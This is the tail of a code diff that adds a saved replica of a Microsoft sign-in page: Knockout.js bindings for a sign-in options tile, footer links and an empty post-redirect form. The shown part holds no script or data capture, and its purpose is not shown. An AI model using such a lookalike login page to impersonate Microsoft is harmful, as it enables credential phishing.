+                                    data-bind="
+                    css: { 'list-item': svr.fSupportWindowsStyles },
+                    pressEnter: $fedCredButtonsControl.fedCredButton_onClick,
+                    click: $fedCredButtonsControl.fedCredButton_onClick,
+                    ariaLabel: $data.text + ' ' + $data.helpText"
+                                    aria-label="Sign-in options undefined"
+                                  >
+                                    <div class="table-row">
+                                      <div class="table-cell tile-img medium">
+                                        <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+                                        <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+                                        <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img
+                                          class="tile-img medium"
+                                          role="presentation"
+                                          data-bind="addEventHandlers, attr: { src: $data.darkIconUrl }"
+                                          src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
+                                        /><!-- /ko -->
+                                        <!-- /ko --><!-- /ko -->
+                                      </div>
+                                      <div
+                                        class="table-cell text-left content"
+                                        data-bind="css: { 'content': !svr.fSupportWindowsStyles }"
+                                      >
+                                        <div
+                                          data-bind="text: $data.text, attr: { 'data-test-id': $data.testId }"
+                                          data-test-id="signinOptions"
+                                        >
+                                          Sign-in options
+                                        </div>
+                                        <!-- ko if: $data.showHelpIcon --><!-- /ko -->
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                                <!-- ko if: $data.showHelpIcon --><!-- /ko -->
+                              </div>
+                              <!-- ko if: svr.fAllowExternalIdpSignInCommonEndpoint && $index() === 0 && $fedCredButtonsControl.fedCredOptions().length > 1 --><!-- /ko -->
+                              <!-- /ko -->
+                              <!-- /ko -->
+                              <!-- /ko -->
+
+                              <!-- ko ifnot: svr.fEnableQrCodeA11YFixes --><!-- /ko -->
+                            </div>
+                          </div>
+                          <!-- /ko -->
+                        </div>
+                        <!-- /ko -->
+
+                        <!-- ko if: $page.showSignupFedCredButtons --><!-- /ko -->
+
+                        <!-- ko if: svr.fShowQrCodePinOption --><!-- /ko -->
+
+                        <!-- ko if: $page.newSession --><!-- /ko -->
+                        <!-- /ko -->
+
+                        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
+                      </div>
+                    </div>
+                    <!-- /ko -->
+                  </div>
+                </div>
+              </div>
+
+              <!-- ko if: $page.paginationControlHelper.showFooterControl -->
+              <div
+                id="footer"
+                role="contentinfo"
+                data-bind="
+        externalCss: {
+            'footer': true,
+            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
+            'background-always-visible': $page.backgroundLogoUrl }"
+                class="footer ext-footer"
+              >
+                <div
+                  data-bind="component: { name: 'footer-control',
+            publicMethods: $page.footerMethods,
+            params: {
+                serverData: svr,
+                useDefaultBackground: $page.useDefaultBackground(),
+                hasDarkBackground: $page.backgroundLogoUrl(),
+                showLinks: true,
+                showFooter: $page.showFooter(),
+                hideTOU: $page.hideTOU(),
+                termsText: $page.termsText(),
+                termsLink: $page.termsLink(),
+                hidePrivacy: $page.hidePrivacy(),
+                privacyText: $page.privacyText(),
+                privacyLink: $page.privacyLink() },
+            event: {
+                agreementClick: $page.footer_agreementClick,
+                showDebugDetails: $page.toggleDebugDetails_onClick } }"
+                >
+                  <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
+                  <div
+                    id="footerLinks"
+                    class="footerNode text-secondary footer-links ext-footer-links"
+                    data-bind="externalCss: { 'footer-links': true }"
+                  >
+                    <!-- ko if: showFooter -->
+                    <!-- ko if: !hideTOU -->
+                    <a
+                      id="ftrTerms"
+                      data-bind="
+            text: termsText,
+            href: termsLink,
+            click: termsLink_onClick,
+            externalCss: {
+                'footer-content': true,
+                'footer-item': true,
+                'has-background': !useDefaultBackground,
+                'background-always-visible': hasDarkBackground }"
+                      href="https://www.microsoft.com/en-GB/servicesagreement/"
+                      class="footer-content ext-footer-content footer-item ext-footer-item"
+                      >Terms of use</a
+                    >
+                    <!-- /ko -->
+
+                    <!-- ko if: !hidePrivacy -->
+                    <a
+                      id="ftrPrivacy"
+                      data-bind="
+            text: privacyText,
+            href: privacyLink,
+            click: privacyLink_onClick,
+            externalCss: {
+                'footer-content': true,
+                'footer-item': true,
+                'has-background': !useDefaultBackground,
+                'background-always-visible': hasDarkBackground }"
+                      href="https://privacy.microsoft.com/en-GB/privacystatement"
+                      class="footer-content ext-footer-content footer-item ext-footer-item"
+                      >Privacy &amp; cookies</a
+                    >
+                    <!-- /ko -->
+
+                    <!-- ko if: impressumLink --><!-- /ko -->
+
+                    <!-- ko if: a11yConformeLink --><!-- /ko -->
+
+                    <!-- ko if: showIcpLicense --><!-- /ko -->
+                    <!-- /ko -->
+
+                    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
+                    <a
+                      id="moreOptions"
+                      href="#"
+                      role="button"
+                      data-bind="
+        click: moreInfo_onClick,
+        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
+        attr: { 'aria-expanded': showDebugDetails().toString() },
+        hasFocusEx: focusMoreInfo(),
+        externalCss: {
+            'footer-content': true,
+            'footer-item': true,
+            'debug-item': true,
+            'has-background': !useDefaultBackground,
+            'background-always-visible': hasDarkBackground }"
+                      aria-label="Click here for troubleshooting information"
+                      aria-expanded="false"
+                      class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item"
+                      >...</a
+                    >
+                  </div>
+                  <!-- /ko -->
+
+                  <!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko -->
+                </div>
+              </div>
+              <!-- /ko -->
+            </div>
+            <!-- /ko -->
+          </div>
+          <!-- /ko -->
+
+          <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
+          <!-- /ko -->
+          <!-- /ko -->
+        </div>
+        <!-- /ko -->
+      </form>
+
+      <form
+        data-bind="postRedirectForm: postRedirect"
+        method="POST"
+        action="#"
+        aria-hidden="true"
+        target="_top"
+      ></form>
+
+      <!-- ko if: svr.urlCBPartnerPreload --><!-- /ko -->
+
+      <!-- ko if: svr.fEnableDFPIntegration && dfpUrl() --><!-- /ko -->
+    </div>
+  </body>
+</html>
